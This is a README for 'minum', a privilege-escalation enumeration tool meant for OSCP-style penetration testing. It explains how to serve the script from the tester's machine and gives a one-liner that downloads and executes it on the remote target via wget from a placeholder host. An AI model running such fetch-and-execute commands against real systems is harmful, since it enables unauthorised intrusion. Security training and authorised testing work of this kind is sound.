# minum : Minimal Enumeration Tool

This enumeration for privilege escalation tool, unlike many others, is built towards the idea of finding the top most relevant privilege escalation vectors for its user.  
The idea is to prevent throwing a lot of things at the user and let him begin searching for a needle in a haystack.  

Instead, it will ask you for your preferable routes throughout its running and will present to the user only the interesting stuff.
Letting you spend more time on exploiting and less time on reading tons of text all over the place.  
At the end it will also load for you linpeas.sh automatically in case you want an indepth lookout.  

Have fun, and use my tool for good purposes! Educational purposes ONLY !!

P.S

Have some suggestions? Leave an issue and we will be able to look at it and make modifications.

Cheers!

## Install
On your local machine:
```
git clone https://github.com/nirzaaa/minum.git
cd minum
python -m http.server
```
p.s.  
Pay attention to play `linpeas.sh` and `pspy64` in that folder so we will be able to download it for you automatically :)

On the remote machine:
```
wget <my_ip>:<my_port>/minlinum.sh; chmod +x minlinum.sh; ./minlinum.sh
```

## Usage

You can download the script to the remote machine and run it for you automatically by using:  
`wget <my_ip>:<my_port>/minlinum.sh; chmod +x minlinum.sh; ./minlinum.sh`

## Suggestions
Have any suggestions? Something is missing? (:grimacing:) You can leave us an issue and we will look into it :smiley:

## Support us
A wise man once said that 160 cups of coffee equals 1 attempt for the oscp exam.  
Take me a coffee step further towards the opportunity of a lifetime :)  
[![name](https://user-images.githubusercontent.com/117816100/206117004-54c33ba1-918e-43d2-96b4-b71018455a1e.png)](https://www.buymeacoffee.com/nirza)
